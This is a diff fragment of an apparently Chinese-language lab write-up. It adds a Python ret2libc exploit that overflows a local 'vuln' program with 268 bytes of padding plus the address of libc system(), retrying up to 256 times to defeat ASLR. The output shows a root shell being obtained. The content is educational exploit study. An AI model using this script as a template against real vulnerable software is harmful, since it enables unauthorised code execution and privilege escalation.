@@ -59,4 +59,48 @@ sh-4.2# ldd ./vuln | grep libc
   7618: 00132650    73 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr
   7683: 0003ef70    98 FUNC    GLOBAL DEFAULT   13 __libc_system
 ```
+最后的exp
+```python
+# exp.py
+# !/usr/bin/env python
+import struct
+from subprocess import call
 
+libc_base_addr = 0xf7523000
+whatever = 0xffffffff
+system_off = 0x0003ef70  # Obtained from "readelf -s libc.so.6 | grep exit" command.
+system_addr = libc_base_addr + system_off
+system_arg = 0x804826e  #   objdump -s vuln | less
+
+
+# endianess convertion
+def conv(num):
+    return struct.pack("<I", num)
+
+# Junk + system + whatever + system_arg
+buf = "A" * 268
+buf += conv(system_addr)
+buf += conv(whatever)
+buf += conv(system_arg)
+
+print "Calling vulnerable program"
+# Multiple tries until we get lucky
+i = 0
+while (i < 256):
+    print "Number of tries: %d" % i
+    i += 1
+    ret = call(["./vuln", buf])
+    if (not ret):
+        break
+    else:
+        print "Exploit failed"
+```
+最后的结果
+```shell
+Exploit failed
+Number of tries: 61
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApV鬣[U鱪
+sh-4.2# who
+root     pts/0        2019-11-08 23:19 (61.172.241.120)
+```
+竟然真成功了。。。。
